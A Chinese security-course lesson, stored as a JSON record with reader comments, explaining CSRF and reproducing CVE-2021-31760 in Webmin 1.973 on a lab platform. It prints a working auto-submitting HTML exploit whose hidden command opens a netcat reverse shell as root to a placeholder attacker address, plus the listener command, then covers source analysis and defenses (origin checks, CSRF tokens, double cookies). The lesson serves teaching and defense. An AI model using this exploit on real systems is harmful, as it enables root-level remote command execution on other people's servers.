{"id":472487,"title":"05｜CSRF：为什么用户的操作他自己不承认？","content":"<p>你好，我是王昊天。</p><p>想象你是个青春阳光的精神小伙，和女神小美青梅竹马，培养了十几年的感情。眼看着就要抱得美人归时，半路杀出了个男二号，成了你的竞争对手。有一天你们恰好在一起聚会，男二号趁你上厕所，用你的手机给小美发了微信。</p><p>“小美，你闺蜜真好看，可以介绍给我吗？”</p><p>你回来时，小美大骂了你一通，然后生气地摔门而去。</p><p>在这个故事里，男二就通过他的行为完成了一次CSRF。</p><h2>CSRF</h2><p>CSRF的全名是Cross-Site Request Forgery，中文名称是跨站点请求伪造，简单来说，<strong>就是让Web应用程序不能有效地分辨一个外部的请求，是否真正来自发起请求的用户</strong>，虽然这个请求可能是构造完整、并且输入合法的。</p><p>和前几节课程中学习过的漏洞相比，CSRF有自己的漏洞名称，明显是一个更为细分的漏洞类型，而非一个漏洞类别。它作为一个独立的细分漏洞类型，值得我们单独进行探讨，说明影响力是足够大的。</p><p>扩展开讲一讲，当一个Web应用在设计过程中没有充分考虑来自客户端请求的验证机制时，就可能会遇到CSRF问题。站在攻击者的视角来看，他可以通过一个URL、图片加载或者XMLHttpRequest等方式，让用户触发一个自动化请求发送行为，这个请求在Web Server接受时会被认为是合法的。</p><!-- [[[read_end]]] --><p><strong>接下来我们看一个典型的攻击场景。</strong></p><p>如下HTML目的是让用户更新自己的信息：</p><pre><code class=\"language-plain\">&lt;form action = \"/url/profile.php\" method = \"post\"&gt;\n    &lt;input type = \"text\" name = \"firstname\" /&gt;\n    &lt;input type = \"text\" name = \"lastname\" /&gt;\n    &lt;br/&gt;\n    &lt;input type = \"text\" name = \"email\" /&gt;\n    &lt;input type = \"submit\" name = \"submit\" value = \"Update\" /&gt;\n&lt;/form&gt;\n</code></pre><p>其中的profile.php包含如下代码：</p><pre><code class=\"language-php\">// initial the seesion in order to validate sessions\nsession_start();\n// if the session is registered a valid user the allow update\nif ( !session_is_registered(\"username\") )\n{\n    echo \"invalid session detected!\";\n    // Redirect user to login page\n    ...\n    exit;\n}\n// The user session is valid, so process the request\n// and update the information\nupdate_profile();\n</code></pre><p>这里的PHP代码中是包含了一些保护措施的，结合我们前面几节课程学到的内容来看，它包含了用户身份的有效性认证，阻止了越权访问。<strong>但是上述代码并不能够有效地防止CSRF攻击，</strong>如果攻击者可以构建下面这段代码，并且将它托管到某个站点，那么当用户保持登录状态并且访问攻击代码页面时，就会触发攻击代码：</p><pre><code class=\"language-javascript\">&lt;script&gt;\n    function attack()\n    {\n        form.email = \"attacker@example.com\"\n        form.submit();\n    }\n&lt;script&gt;\n\n&lt;body onload = \"attack()\"&gt;\n    // ...\n&lt;/body&gt;\n</code></pre><p>可以看到，上述攻击代码包含了用户在使用浏览器时不可见的内容，当攻击代码在浏览器中加载时，会触发attack函数。如果用户在访问受害网站时保持的登录状态，受害网站就会收到来自用户的请求，请求内容是将E-mail更新为攻击者的邮件地址。这样在后续的攻击操作中，例如邮件验证码等操作都会发送到攻击者邮箱。</p><p>通过上述典型的攻击代码，<strong>我们可以总结出几点CSRF攻击特征</strong>：</p><ul>\n<li>攻击一般发生在跨域场景下，主要原因是外域相较于被攻击目标通常安全级别更低，攻击者更容易控制；</li>\n<li>CSRF在攻击过程中事实上并没有获取到用户的登录凭据，只是借用户之手发送了恶意的请求；</li>\n<li>攻击者可以采用的方式有很多：图片URL、超链接、表单提交等许多方式。</li>\n</ul><h2>案例实战</h2><h4>CVE-2021-31760</h4><p>我为你准备了一份新鲜又甜美可口的漏洞，来实际体验CSRF漏洞挖掘过程以及实际利用效果，那么不卖关子了，直接上漏洞编号——CVE-2021-31760。</p><p>首先介绍一下Webmin，Webmin是一个基于Web的系统配置工具，它是一款开源工具，主要由杰米·卡梅隆（Jamie Cameron）和Webmin社区进行共同维护。Webmin允许用户配置操作系统内部信息，例如用户、磁盘配额、服务或配置文件，以及修改和控制开源应用，例如Apache http服务器或MySQL等。CVE-2021-31760主要影响Webmin 1.973版本，通过CSRF漏洞的利用可以实现远程命令执行（RCE）的效果。</p><p>该漏洞环境已经在谜团<a href=\"https://mituan.zone/#/\">MiTuan</a>上构建完成，你可以直接访问谜团搜索CVE-2021-31760进行复现。</p><h4>漏洞挖掘过程</h4><p>接下来我们进入漏洞挖掘过程，来看该漏洞是如何被发现的。</p><p>首先从官方的GitHub仓库下载1.973版本的源代码，官方仓库地址是<a href=\"https://github.com/webmin/webmin\">GitHub - webmin/webmin: Powerful and flexible web-based server management control panel</a>。然后进入如下目录，选择run.cgi文件打开：</p><pre><code class=\"language-bash\">hunter@HunterdeiMac  ~/Downloads/webmin/proc  vim run.cgi\n</code></pre><p>通过查看程序代码主体可以发现代码中并没有关于访问来源的审计：</p><pre><code class=\"language-bash\">...\n$in{'input'} =~ s/\\r//g;\n$cmd = $in{'cmd'};\nif (&amp;supports_users()) {\n    defined(getpwnam($in{'user'})) || &amp;error($text{'run_euser'});\n    &amp;can_edit_process($in{'user'}) || &amp;error($text{'run_euser2'});\n    if ($in{'user'} ne getpwuid($&lt;)) {\n        $cmd = &amp;command_as_user($in{'user'}, 0, $cmd);\n        }\n    }\n\nif ($in{'mode'}) {\n    # fork and run..\n    if (!($pid = fork())) {\n        close(STDIN); close(STDOUT); close(STDERR);\n        &amp;open_execute_command(PROC, \"($cmd)\", 0);\n        print PROC $in{'input'};\n        close(PROC);\n        exit;\n        }\n    &amp;redirect(\"index_tree.cgi\");\n    }\nelse {\n    # run and display output..\n    &amp;ui_print_unbuffered_header(undef, $text{'run_title'}, \"\");\n    print \"&lt;p&gt;\\n\";\n    print &amp;text('run_output', \"&lt;tt&gt;\".&amp;html_escape($in{'cmd'}).\"&lt;/tt&gt;\"),\"&lt;p&gt;\\n\";\n    print \"&lt;pre&gt;\";\n    $got = &amp;safe_process_exec_logged($cmd, 0, 0,\n                     STDOUT, $in{'input'}, 1);\n    if (!$got) { print \"&lt;i&gt;$text{'run_none'}&lt;/i&gt;\\n\"; }\n    print \"&lt;/pre&gt;\\n\";\n    &amp;ui_print_footer(\"\", $text{'index'});\n    }\n&amp;webmin_log(\"run\", undef, undef, \\%in);\n</code></pre><p>通过分析源码我们得知代码没有针对CSRF的保护措施，因此我们只需很简单的CSRF构造即可触发该漏洞，并且由于该漏洞触发点是run.cgi文件，我们可以直接通过CSRF构建RCE（远程命令执行），这是非常理想的漏洞利用场景。</p><h4>漏洞利用</h4><p>接下来我们通过构造PoC，尝试利用这个漏洞。</p><p>首先我们来构造一个HTML文件，<strong>这个HTML的核心目标是进行form表单的自动提交</strong>，源码如下：</p><pre><code class=\"language-plain\">&lt;html&gt;\n        &lt;head&gt;\n            &lt;meta name=\"referrer\" content=\"never\"&gt;\n        &lt;/head&gt;\n  &lt;body&gt;\n    &lt;form action=\"http://your_mituan_app_address/proc/run.cgi\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"cmd\" value=\"mkfifo /tmp/378; nc your_ip your_port 0&lt;/tmp/378 | /bin/sh &gt;/tmp/378 2&gt;&amp;1; rm /tmp/378\" /&gt;\n      &lt;input type=\"hidden\" name=\"mode\" value=\"0\" /&gt;\n      &lt;input type=\"hidden\" name=\"user\" value=\"root\" /&gt;\n      &lt;input type=\"hidden\" name=\"input\" value=\"\" /&gt;\n      &lt;input type=\"hidden\" name=\"undefined\" value=\"\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre><p><strong>其中主要参数是cmd字段，其含义是：</strong></p><ol>\n<li>创建一个命名管道378；</li>\n<li>Webmin作为客户端使用nc连接黑客控制的服务端，接收命令，并通过匿名管道将命令重定向到bash；</li>\n<li>bash执行服务端发过来的命令，将输出重定向到命名管道378，并通过命名管道378将输出重定向到nc发送给服务端。</li>\n</ol><p>这一条命令实际包含了两条管道，一条匿名管道，一条命名管道，并使其各司其职。它先后将html文件中的your_mituan_app_address、your_ip、your_port替换为谜团启动的应用URL、你的服务器地址、你的服务器IP，即可开始CSRF攻击。</p><p>让我们看看这次攻击经历了哪些流程：首先我们以管理员身份登录Webmin界面，在自己的服务器上启动nc进行监听：nc -l -p  1337，然后使用浏览器直接打开我们创建的HTML页面，到这里我们的攻击就已完成，服务器上的nc已经接入Webmin服务器的bash，可以执行任意命令。</p><h4>漏洞分析</h4><p>既然已经成功利用了该漏洞，接下来我们就要分析这一类漏洞该如何修复。<strong>最简单的方式就是校验这次访问的来源。</strong>事实上，Webmin已经做了这种防御。你肯定会有疑问，为什么做了防御仍然会出现CVE-2021-31760漏洞呢？其实这是由于一个配置项引起的，在构建Webmin平台的过程中，我们对config文件进行了修改：</p><pre><code class=\"language-plain\">/etc/webmin/config -&gt; referers_none=0\n</code></pre><p>在官方的说明中，该项就是在判断不同来源的request能否生效，你可以通过如下命令修改配置并重启Webmin服务：</p><pre><code class=\"language-plain\">// 将referers_none=0修改为referers_none=1\nvim /etc/webmin/config\n// 重启webmin服务\nservice webmin restart\n</code></pre><p>再次尝试就会发现该漏洞已经消失了，这也是我在追踪这个漏洞时惊讶的点。也许正是这个原因，截至写稿时，Webmin已经在存在漏洞的版本发布了至少5次更新，但是却并没有修复该漏洞。</p><p>到这里你肯定更好奇了，既然Webmin有相关的保护措施，那CVE-2021-31760这个漏洞是否真实存在呢？</p><p>这是个好问题，我们继续来深挖一下：</p><p>首先，<strong>该配置项是如何生效的？</strong></p><p>通过对源码的追踪分析，我们可以发现存在如下函数调用链：</p><pre><code class=\"language-bash\"># run.cgi\n# line 5\nrequire './proc-lib.pl';\n&amp;ReadParse();\n$access{'run'} || &amp;error($text{'run_ecannot'});\n...\n# proc-lib.pl\n# line 9\n&amp;init_config();\n...\n# web-lib-funcs.pl\n# line 5142\n    if (!$gconfig{'referers_none'}) {\n        # Known referers are allowed\n        $trust = 1;\n        }\n    elsif ($trustvar == 2) {\n        # Module wants to trust unknown referers\n        $trust = 1;\n        }\n    else {\n        $trust = 0;\n        }\n    }\n...\n# webmin/web-lib-funcs.pl\n# line 5205\n# function init_config\n...\nif (!$trust) {\n    # Looks like a link from elsewhere .. show an error\n    $current_theme = undef;\n    &amp;header($text{'referer_title'}, \"\", undef, 0, 1, 1);\n\n    $prot = lc($ENV{'HTTPS'}) eq 'on' ? \"https\" : \"http\";\n    my $url = \"&lt;tt&gt;\".&amp;html_escape(\"$prot://$ENV{'HTTP_HOST'}$ENV{'REQUEST_URI'}\").\"&lt;/tt&gt;\";\n    if ($referer_site) {\n        # From a known host\n        print &amp;text('referer_warn',\n                \"&lt;tt&gt;\".&amp;html_escape($r).\"&lt;/tt&gt;\", $url);\n        print \"&lt;p&gt;\\n\";\n        print &amp;text('referer_fix1', &amp;html_escape($http_host)),\"&lt;p&gt;\\n\";\n        print &amp;text('referer_fix2', &amp;html_escape($http_host)),\"&lt;p&gt;\\n\";\n        }\n    else {\n        # No referer info given\n        print &amp;text('referer_warn_unknown', $url),\"&lt;p&gt;\\n\";\n        print &amp;text('referer_fix3u'),\"&lt;p&gt;\\n\";\n        print &amp;text('referer_fix2u'),\"&lt;p&gt;\\n\";\n        }\n    print \"&lt;p&gt;\\n\";\n\n    &amp;footer();\n    exit;\n    }\n...\n</code></pre><p>至此，我们发现referers_none配置项的启用，可以影响到run.cgi的工作流程，使其对于包含不同referers的http request继续提供支持。</p><p>是否该项配置项就足够了呢？其实答案是否定的，因为CSRF漏洞一般发生在跨域场景，但是这句话并不绝对，对于同域场景发生的CSRF攻击，上述配置项是难以抵御的。虽然同域场景对攻击者的能力有更高的要求，但是一旦问题发生，我们可以看到root权限级别的RCE仍然是非常恐怖的。</p><p>那么如何从开源代码中学习漏洞挖掘以及安全开发呢？授人以鱼不如授人以渔，<strong>这个漏洞的学习除了本身的知识点，更重要的是如何通过对一个CVE漏洞的分析，去掌握漏洞分析和修复的规律。</strong></p><p>在分析一个漏洞时，一定要分析清楚函数调用关系，清晰地了解输入是经过怎样的过程最终影响到输出的。然后一个有质量的漏洞，产品团队一般会在漏洞公布的第一时间进行修复，我们可以使用GitHub的版本比对功能，拿漏洞出现的版本与修复后版本进行源码比对，通过这样的方式可以帮助我们了解优秀的项目是如何解决同类安全问题的。</p><p>通过这种方式，我们可以学习到很多优秀宝贵的经验，快速提升我们的开发水平。</p><h2>防御及检测</h2><p>根据CSRF的攻击特点，我们可以采用以下几种方式进行防御：</p><p><strong>1. 同源策略</strong></p><p>该防御策略的产生主要为了针对CSRF攻击的第一个特征——跨域场景，它的设计思路主要是禁止外域（或者不受信任的域名）对Web Server发起请求。在HTTP协议中，有两个Header字段可以用来帮助我们判断来源域：Origin Header 和 Referer Header。这两个字段在浏览器发送请求时会自动携带，并且<strong>不能由前端修改</strong>。</p><p>你可能会有疑问：这两个字段很明显是依赖于浏览器实现的，现在浏览器种类那么多，如果浏览器不支持怎么办？必须承认，这是个很好的问题，HTTP协议标准本身在动态更新，很多比较旧版本的浏览器可能不支持这个Policy，如果出现这种情况最好的策略就是阻止这次请求。</p><p><strong>2. Token</strong></p><p>回顾我们在总结CSRF特点时提到的特征，CSRF一般发生在跨域场景下，但是并不绝对。如果攻击者是在本域发起的CSRF攻击，那么同源策略就会失效，因此我们需要一种更严格的防护策略——CSRF Token。</p><p>那么CSRF Token如何实现呢？为每一个form表单生成唯一的token，并且在form提交时验证token，就是CSRF Token的实现思路，但是token需要保证不可预测。在代码实现上主要有2种思路。</p><p>第一种是在用户访问页面时，由服务器生成Token，将生成的Token存放于Session中，一般Token生成时会通过加密算法实现，输入一般包括随机字符串、时间戳等，要注意Token也会有有效期。</p><p>第二种是每次加载页面时通过JS遍历DOM树结构插入Token：</p><pre><code class=\"language-plain\">GET: http://example.com?csrf_token=value\nPOST: &lt;input type = \"hidden\" name = \"csrf_token\" value = \"value\"/&gt;\n</code></pre><p>了解了客户端实现之后，你肯定自然地想到了后面的问题——服务端收到HTTP请求后怎么验证token的正确性呢？</p><p>要注意，对于分布式Web应用，使用Session存储Token会非常不方便，所以一般采用中间件存储或者动态计算的方式来优化。中间件存储方案是将Token存储在Redis中间件上，这样可以保证不同服务器取得的token值一致；动态计算方案是Token的原始输入不再采用随机数，而是采用UID等用户信息，同时加密算法采用对称加密算法，这样可以保证任何一台分布式服务器取到Token后都可以执行解密操作并进行数据正确性比对。</p><p><strong>3. 接口设计</strong></p><p>对于同源策略的实现，是有一些特殊的场景需要被作为例外处理的。按照我们之前的设计，用户来自搜索引擎链接的跳转会被无差异判定为CSRF攻击，这时我们就要判断特定情况并进行放行处理，一般情况下我们都会放行GET请求。但此时如果Web应用实现上允许用户通过GET请求发送敏感操作，就会出现安全问题。这提醒我们，不要在GET请求中允许用户执行敏感操作。</p><p>这里我们可以引入一个更形象的、非技术手段的抵制CSRF的案例——人工形态的CSRF_Token，在许多重要的支付环节，都需要在最后一步发送手机验证码、邮件验证码或者进行人脸识别，其实这就是通过应用流程设计的角度实现的一种CSRF_Token变种验证操作。</p><p>现在的防御方案，主要考虑的是如何防止跨域的CSRF。因为攻击者无法获取到Token，所以大家会普遍认为，本域发生的CSRF暂时是安全的。但是，如果XSS和CSRF问题同时在本域发生，由于XSS可以让攻击者获取Token，CSRF的防御就宣告失效。因此我们需要在Web应用设计和开发过程中，严格过滤用户的输入，确保用户不能够输入我们不希望出现的内容，这样可以同时规避掉XSS和CSRF安全风险。</p><p><strong>4. 双重Cookie</strong></p><p>在Web应用开发中新增CSRF_Token机制还是稍有些麻烦，那么我们该如何通过现有的组件，来实现CSRF防御方案呢？答案是双重Cookie。</p><p>当用户访问Web网站时，Web应用为用户随机生成一个新的Cookie值，当Web应用每次执行表单提交操作时都需要携带这个Cookie值；由于同源策略的保护，攻击者无法获取或者修改这个Cookie项，因此实现了CSRF的保护。</p><p>但要注意的是这项技术需要用到JavaScript，因此在一些JavaScript Disabled的浏览器中是无法工作的。</p><p>除此以外，双重Cookie也面临一些风险。比如本域Web应用存在XSS漏洞，该防御将失效。以及为了确保Cookie传输安全，需要采用整站HTTPS，否则Cookie泄露也会导致该防御失效。</p><h2>总结</h2><p>这节课我们探讨了一类主流的安全风险——CSRF，首先我们列出了CSRF风险的常见特征：首先，由于外域更容易被攻击者控制，攻击一般发生在跨域场景下；其次，CSRF在攻击过程中并没有获取到用户的登录凭据，只是借用户之手发送了恶意的请求；最后，攻击者可以采用图片URL、超链接、表单提交等许多方式实现攻击。</p><p>然后我们以2021年上半年的一个CSRF RCE漏洞为例，对它进行了实例分析，这个过程中我们首先完成了对CVE-2021-31760漏洞的复现，并针对该漏洞修复方案进行评估，然后又通过这个漏洞，学习了漏洞挖掘、漏洞分析以及漏洞修复方法。</p><p>最后我们给出了一些业内普遍认可的，新颖的解决方案，供你在工作中使用，他们分别是：同源策略、CSRF Token、接口设计层保护、双重Cookie和Samesite Cookie</p><p>以上，就是关于CSRF我们一起学习探讨的内容，欢迎大家在评论区留言讨论。什么？你说Samesite Cookie没讲？那就作为课后作业吧！</p><h2>思考题</h2><p>为了防御CSRF，除了上述安全方案，业内提出了一种新的解决方案——Samesite Cookie，你可以通过自己的研究，讲讲它和双重Cookie的区别吗？</p><p>欢迎在评论区留下你的思考，我们下节课再见！</p>","neighbors":{"left":{"article_title":"04｜权限不合理：攻击者进来就是root权限？","id":471890},"right":{"article_title":"06｜加密失败：使用了加密算法也会被破解吗？","id":473382}},"comments":[{"had_liked":false,"id":328128,"user_name":"DoHer4S","can_delete":false,"product_type":"c1","uid":2391667,"ip_address":"","ucode":"A1D028355FAEB8","user_header":"https://static001.geekbang.org/account/avatar/00/24/7e/73/a5d76036.jpg","comment_is_top":false,"comment_ctime":1640567635,"is_pvip":true,"replies":[{"id":"119671","content":"wow 活捉一只好认真的同学 有成为大佬的潜质唉ε=(´ο｀*)))","user_name":"作者回复","user_name_real":"编辑","uid":"1989426","ctime":1640774789,"ip_address":"","comment_id":328128,"utype":1}],"discussion_count":1,"race_medal":0,"score":"14525469523","product_id":100101501,"comment_content":"Samesite Cookie 是一种JavaScript技术，因此需要在启用JavaScript的浏览器才可以使用该技术；<br><br>“双重Cookie” 和 “Samesite Cookie” 都需要在HTTPS应用协议下使用；<br><br>Samesite Cookie 是 HTTP 响应头 Set-Cookie 的属性之一，用于声明该Cookie是否仅限于第一方(首次发起请求的客户端)或者同一网站的后端上下文(后端设置该Cookie的失效时间，在这个失效时间内任意客户端进行通信使用该Cookie是合法的)。<br><br>Samesite 支持三种参数形式，因为该参数是一个配置项，事实上是对 “Cookie&#47;Set-Cookie”  中的Cookie信息的使用进行规范，这种规范是对浏览器的功能进行规范的：<br><br>- “Lax” ： Cookies允许和顶级导航一起发送，这种方式就是跨域请求，即支持第三方搜索引擎的GET请求，支支持三种情况：链接、预加载请求、GET表单；<br><br>- “Strict”： Cookies只会在第一方的上下文发送，不会与第三方的网站发起的请求一起发送，只有当前网页的URL 与 请求目标一致才会带上Cookie；<br><br>  举一个例子，在一个网站上假设有两条外链，第一条外链是QQ的链接，允许携带Cookie(Samesite=Lax)，一条 Github 不允许携带Cookie(Samesite=Strict)；则在这个网站单击链接进行跳转之后，如果你之前已经同时登录了QQ和Github，Github网站会要求你重新输入信息登录；<br><br>- “None”： 不对 Cookies 进行任何限制 - 非常地不安全，无法防范CSRF攻击；<br><br>Samesite Cookie 和 双重Cookie 两者技术的区别：<br><br>- 根本区别： <br>  + Samesite Cookie 技术限制的是使用Cookie的范围，即其作用是：可以阻止第三方滥用Cookie，即上述所述对URL发送请求能否携带Cookie；<br>  + 双重Cookie 的技术是：用户访问页面（拥有特定的域名），注入一个Cookie，该Cookie不是由后端决定的，是由前端随机生成的，提交给后端进行存储；当前端重新进行请求时，重新发送Cookie通过URL参数，后端进行验证是否与第一次访问相同，相同允许，不相同拒绝；<br>- Samesite 缺点：<br>  - 如果一个网站有多个子域，那么主域的Cookie无法被携带到子域；<br>  - Lax 下还有存在CSRF攻击的可能性的，如果设置为 Strict，那么用户体验不好；<br>- 双重 Cookie 缺点：<br>  - 占用 Cookie的额外空间，URL额外空间；<br>  - XSS 如果获取到客户端的Cookie那么就会失效；<br>  - 无法做到子域隔离<br><br>","like_count":4,"discussions":[{"author":{"id":1989426,"avatar":"https://static001.geekbang.org/account/avatar/00/1e/5b/32/d0fbee97.jpg","nickname":"王昊天","note":"","ucode":"A13BBE0E61BC61","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":542526,"discussion_content":"wow 活捉一只好认真的同学 有成为大佬的潜质唉ε=(´ο｀*)))","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1640774789,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":328115,"user_name":"孜孜","can_delete":false,"product_type":"c1","uid":1018203,"ip_address":"","ucode":"7EF4FB644357CE","user_header":"https://static001.geekbang.org/account/avatar/00/0f/89/5b/d8f78c1e.jpg","comment_is_top":false,"comment_ctime":1640539056,"is_pvip":true,"replies":[{"id":"119672","content":"理解真棒 可真聪明o(￣▽￣)ｄ good","user_name":"作者回复","user_name_real":"编辑","uid":"1989426","ctime":1640775022,"ip_address":"","comment_id":328115,"utype":1}],"discussion_count":2,"race_medal":0,"score":"5935506352","product_id":100101501,"comment_content":"下面是我的理解，理论上，在现代浏览器下，cors完全可以防止csrf，因为永远可以校验origin。。但是如果使用img tag浏览器就不会发送origin header(这是html 设计的失误)，这样服务器就没办法知道这是跨域请求，然后在恶意网站在监听img onload事件就可以知道资源是否加载成功。虽然无法拿到非img的数据，但是这样就可以判断用户是否登陆某些网站或者判断用户是否在企业内网etc。。更严重甚至可以利用img标签请求json数据并通过cpu的bug，拿到这个json数据。 这就是为什么在破坏web兼容性的前提下，新加samesite cookies的原因，让跨域请求无法默认带cookies，这样就避免了csrf。","like_count":2,"discussions":[{"author":{"id":1989426,"avatar":"https://static001.geekbang.org/account/avatar/00/1e/5b/32/d0fbee97.jpg","nickname":"王昊天","note":"","ucode":"A13BBE0E61BC61","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":542527,"discussion_content":"理解真棒 可真聪明o(￣▽￣)ｄ good","likes_number":1,"is_delete":false,"is_hidden":false,"ctime":1640775022,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":1,"child_discussions":[{"author":{"id":1018203,"avatar":"https://static001.geekbang.org/account/avatar/00/0f/89/5b/d8f78c1e.jpg","nickname":"孜孜","note":"","ucode":"7EF4FB644357CE","race_medal":0,"user_type":1,"is_pvip":true},"reply_author":{"id":1989426,"avatar":"https://static001.geekbang.org/account/avatar/00/1e/5b/32/d0fbee97.jpg","nickname":"王昊天","note":"","ucode":"A13BBE0E61BC61","race_medal":0,"user_type":2,"is_pvip":false},"discussion":{"id":542533,"discussion_content":"谢谢夸奖。。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1640776645,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":542527,"ip_address":""},"score":542533,"extra":""}]}]},{"had_liked":false,"id":336283,"user_name":"孤雁独鸣","can_delete":false,"product_type":"c1","uid":1134704,"ip_address":"","ucode":"4666A2CE478803","user_header":"https://static001.geekbang.org/account/avatar/00/11/50/70/6856fd0f.jpg","comment_is_top":false,"comment_ctime":1646049750,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1646049750","product_id":100101501,"comment_content":"老师有没有h5静态代码扫描疑似漏洞的开源工具呢，要不然漏洞挖掘也不应该一直人肉找","like_count":0},{"had_liked":false,"id":330883,"user_name":"E-N","can_delete":false,"product_type":"c1","uid":1302170,"ip_address":"","ucode":"2BFD09695B7F63","user_header":"https://static001.geekbang.org/account/avatar/00/13/de/9a/bf7634a3.jpg","comment_is_top":false,"comment_ctime":1642246742,"is_pvip":false,"discussion_count":1,"race_medal":0,"score":"1642246742","product_id":100101501,"comment_content":"老师在 MiTuan 里放的靶机似乎没有安装 nc，无法最终复现漏洞，不过自己搭建一下环境也不麻烦。","like_count":0,"discussions":[{"author":{"id":2277912,"avatar":"","nickname":"Geek_73a7e9","note":"","ucode":"4EB4AA5E16DFAA","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":554038,"discussion_content":"还有个办法直接在漏洞环境上装nc,  apt-get -y --force-yes install netcat\nhttp://5e00cbae2be04998af4fc7919af289db.app.mituan.zone:10000/shell/?xnavigation=1  。不过我反弹shell后只能执行whoami有回显，其他都没回显(有established状态)。。。","likes_number":1,"is_delete":false,"is_hidden":false,"ctime":1646193358,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]}]}]}